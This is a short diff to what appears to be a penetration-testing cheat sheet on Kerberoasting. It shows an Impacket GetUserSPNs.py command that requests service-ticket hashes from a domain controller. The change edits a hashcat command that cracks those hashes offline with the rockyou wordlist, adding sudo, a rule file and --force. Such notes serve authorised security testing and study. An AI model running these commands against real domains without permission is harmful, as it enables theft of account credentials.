@@ -13,5 +13,5 @@ GetUserSPNs.py [DOMAIN]/[USERNAME]:[PASSWORD] -dc-ip [IP of DC] -request
 ```
 Store the hash in a text file and decrypt the hash:
 ```bash
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+sudo hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
